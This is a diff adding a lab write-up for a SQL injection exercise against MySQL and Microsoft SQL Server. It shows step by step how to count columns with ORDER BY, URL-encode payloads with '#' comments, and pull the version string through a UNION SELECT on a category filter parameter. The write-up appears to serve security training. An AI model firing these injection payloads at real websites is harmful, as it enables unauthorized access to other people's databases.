@@ -108,3 +108,70 @@ Database version string extracted successfully.
  - Data types must be compatible
 
  - Oracle is strict about query structure
+
+## Lab 4 – Querying database type and version (MySQL & Microsoft SQL Server)
+
+###  Lab Info
+This lab contains a SQL injection vulnerability in the product category filter.  
+A UNION-based injection can be used to retrieve data from an injected query.
+
+###  Goal
+Display the database version string.
+
+###  Step 1 – Determine the number of columns
+To use the UNION operator, both queries must return the same number of columns.
+I first attempted the classic ORDER BY technique:
+
+```sql
+ORDER BY 1--
+```
+
+However, this caused an internal server error.
+Since the payload was placed inside a URL parameter, I switched to using URL-encoded input and the # comment style instead.
+
+The working request looked like:
+
+```
+Gifts'%20ORDER%20BY%201%23
+```
+
+###  Step 2 – Identify the correct column count
+I incremented the index value:
+
+```sql
+ORDER BY 1
+ORDER BY 2
+ORDER BY 3
+```
+
+The query failed at index 3, which indicates that the original query has 2 columns.
+I also observed that both columns were reflected on the page.
+
+###  Step 3 – Retrieve database version
+In both MySQL and Microsoft SQL Server, the database version can be retrieved using:
+
+```sql
+SELECT @@version
+```
+
+I replaced one of the UNION columns with a subquery:
+
+```sql
+UNION SELECT (SELECT @@version), 2#
+```
+
+###  Example Request
+
+```
+filter?category=Gifts' UNION SELECT (SELECT @@version),2%23
+```
+
+###  Notes
+
+ - Column count must match exactly
+
+ - URL encoding is often required for GET parameters
+
+ - Comment characters may behave differently depending on the DBMS
+
+
